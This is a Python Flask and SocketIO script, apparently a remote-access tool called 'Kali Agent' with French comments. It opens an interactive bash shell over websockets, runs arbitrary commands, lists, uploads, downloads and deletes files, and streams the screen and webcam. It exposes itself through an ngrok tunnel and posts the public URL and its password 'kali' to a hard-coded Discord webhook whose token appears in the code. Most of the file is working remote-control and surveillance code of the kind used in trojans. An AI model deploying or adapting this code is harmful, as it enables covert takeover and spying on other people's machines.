#!/usr/bin/env python3
import os, sys, json, base64, io, time, threading, signal, pty, select, struct, fcntl, termios
import subprocess, requests, tempfile, shutil, mimetypes
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file, Response, abort
from flask_socketio import SocketIO, emit

# ===== CONFIG =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1516834045026369709/523I42gDEz_0P1WKwi2-q8oNCUNLzulgF2AS749llpNJGsCNvaB9x59fdq8xalKgZGkN"
NGROK_AUTH_TOKEN = ""  # Optionnel mais recommandé
PORT = 5000
PASSWORD = "kali"  # Mot de passe pour accéder au panel

app = Flask(__name__, template_folder="templates")
app.config["SECRET_KEY"] = os.urandom(16).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ===== GLOBALS =====
shell_fd = None
shell_pid = None
current_dir = os.path.expanduser("~")
camera = None
ngrok_url = None

# ===== SHELL (PTY) =====
def start_shell():
    global shell_fd, shell_pid
    pid, fd = pty.fork()
    if pid == 0:
        os.environ["TERM"] = "xterm-256color"
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
    else:
        shell_fd = fd
        shell_pid = pid
        threading.Thread(target=shell_reader, daemon=True).start()

def shell_reader():
    while True:
        try:
            r, _, _ = select.select([shell_fd], [], [], 0.1)
            if r:
                data = os.read(shell_fd, 4096)
                if not data:
                    break
                socketio.emit("shell:data", {"data": data.decode("utf-8", errors="replace")})
        except:
            break

def set_window_size(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)

# ===== SCREEN CAPTURE =====
def capture_screen():
    try:
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            img = sct.grab(monitor)
            buffer = io.BytesIO()
            from PIL import Image
            Image.frombytes("RGB", img.size, img.rgb).save(buffer, "JPEG", quality=70)
            return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        return None

def screen_stream():
    while True:
        try:
            img = capture_screen()
            if img:
                socketio.emit("screen:frame", {"image": img})
            time.sleep(0.05)
        except:
            break

# ===== WEBCAM =====
def get_webcam():
    global camera
    try:
        import cv2
        if camera is None:
            camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            _, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
            return base64.b64encode(buffer).decode()
        return None
    except:
        return None

def webcam_stream():
    while True:
        try:
            img = get_webcam()
            if img:
                socketio.emit("webcam:frame", {"image": img})
            time.sleep(0.05)
        except:
            break

# ===== FILE OPERATIONS =====
def safe_path(path):
    global current_dir
    if not os.path.isabs(path):
        path = os.path.join(current_dir, path)
    path = os.path.realpath(path)
    return path

# ===== NGROK =====
def start_ngrok():
    global ngrok_url
    try:
        from pyngrok import ngrok as ngrok_client
        if NGROK_AUTH_TOKEN:
            ngrok_client.set_auth_token(NGROK_AUTH_TOKEN)
        tunnel = ngrok_client.connect(PORT, "http")
        ngrok_url = tunnel.public_url
        print(f"[+] Ngrok URL: {ngrok_url}")
        return ngrok_url
    except:
        try:
            result = subprocess.run(
                ["ngrok", "http", str(PORT), "--log", "stdout"],
                capture_output=True, text=True, timeout=5
            )
        except:
            pass

        try:
            r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
            data = r.json()
            ngrok_url = data["tunnels"][0]["public_url"]
            print(f"[+] Ngrok URL: {ngrok_url}")
            return ngrok_url
        except:
            return None

def send_webhook(url):
    try:
        data = {
            "content": f"🚀 **Kali Agent prêt !**\n🔗 **Panel:** {url}\n🔑 **Password:** `{PASSWORD}`\n🕐 {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
            "username": "Kali Agent",
            "avatar_url": "https://cdn.discordapp.com/emojis/1005192846461870111.png"
        }
        requests.post(WEBHOOK_URL, json=data, timeout=10)
        print("[+] Webhook envoyé")
    except Exception as e:
        print(f"[-] Webhook error: {e}")

# ===== AUTH CHECK =====
def check_auth(req):
    auth = req.headers.get("Authorization", "")
    return auth == PASSWORD

@app.before_request
def before_request():
    if request.endpoint and request.endpoint != "panel" and request.method != "OPTIONS":
        if not check_auth(request):
            return jsonify({"error": "Unauthorized"}), 401

# ===== ROUTES =====
@app.route("/")
def panel():
    auth = request.args.get("auth", "")
    if auth != PASSWORD:
        return '<html><body><form method="GET"><input type="password" name="auth" placeholder="Password"><input type="submit"></form></body></html>'
    return render_template("panel.html", password=PASSWORD)

@app.route("/api/auth", methods=["POST"])
def api_auth():
    data = request.json
    if data.get("password") == PASSWORD:
        return jsonify({"ok": True})
    return jsonify({"ok": False}), 401

@app.route("/api/screenshot")
def api_screenshot():
    img = capture_screen()
    if img:
        return jsonify({"image": img})
    return jsonify({"error": "Failed"}), 500

@app.route("/api/webcam")
def api_webcam():
    img = get_webcam()
    if img:
        return jsonify({"image": img})
    return jsonify({"error": "No camera"}), 500

@app.route("/api/ls")
def api_ls():
    global current_dir
    path = request.args.get("path", current_dir)
    real = safe_path(path)
    if not os.path.isdir(real):
        return jsonify({"error": "Not a directory"}), 400
    current_dir = real
    items = []
    for item in os.listdir(real):
        full = os.path.join(real, item)
        items.append({
            "name": item,
            "type": "dir" if os.path.isdir(full) else "file",
            "size": os.path.getsize(full) if os.path.isfile(full) else 0,
            "mtime": os.path.getmtime(full)
        })
    return jsonify({"path": real, "items": items})

@app.route("/api/download")
def api_download():
    path = safe_path(request.args.get("path", ""))
    if not os.path.isfile(path):
        abort(404)
    return send_file(path, as_attachment=True)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    path = safe_path(request.args.get("path", current_dir))
    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files["file"]
    filepath = os.path.join(path, file.filename)
    file.save(filepath)
    return jsonify({"ok": True, "path": filepath})

@app.route("/api/delete", methods=["POST"])
def api_delete():
    data = request.json
    path = safe_path(data.get("path", ""))
    if os.path.isfile(path):
        os.remove(path)
    elif os.path.isdir(path):
        shutil.rmtree(path)
    else:
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/exec", methods=["POST"])
def api_exec():
    data = request.json
    cmd = data.get("cmd", "")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return jsonify({"stdout": result.stdout, "stderr": result.stderr, "code": result.returncode})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Timeout"}), 500

@app.route("/api/info")
def api_info():
    try:
        uname = os.uname()
        return jsonify({
            "hostname": uname.nodename,
            "os": f"{uname.sysname} {uname.release}",
            "user": os.getenv("USER", "unknown"),
            "cwd": current_dir,
            "uptime": open("/proc/uptime").read().split()[0] if os.path.exists("/proc/uptime") else "N/A"
        })
    except:
        return jsonify({"hostname": "unknown"})

# ===== SOCKETIO EVENTS =====
@socketio.on("shell:input")
def handle_shell_input(data):
    global shell_fd
    if shell_fd:
        try:
            os.write(shell_fd, data["data"].encode())
        except:
            pass

@socketio.on("shell:resize")
def handle_shell_resize(data):
    global shell_fd
    if shell_fd:
        set_window_size(shell_fd, data.get("rows", 24), data.get("cols", 80))

@socketio.on("start:screen")
def handle_start_screen():
    threading.Thread(target=screen_stream, daemon=True).start()

@socketio.on("start:webcam")
def handle_start_webcam():
    threading.Thread(target=webcam_stream, daemon=True).start()

# ===== MAIN =====
if __name__ == "__main__":
    print("[+] Démarrage de l'agent Kali...")
    print(f"[+] Port: {PORT}")

    start_shell()
    print("[+] Shell PTY démarré")

    url = start_ngrok()
    if url:
        print(f"[+] URL publique: {url}")
        send_webhook(url)
    else:
        print("[-] Ngrok non disponible, en local uniquement")
        print(f"[+] Accès local: http://127.0.0.1:{PORT}")

    socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
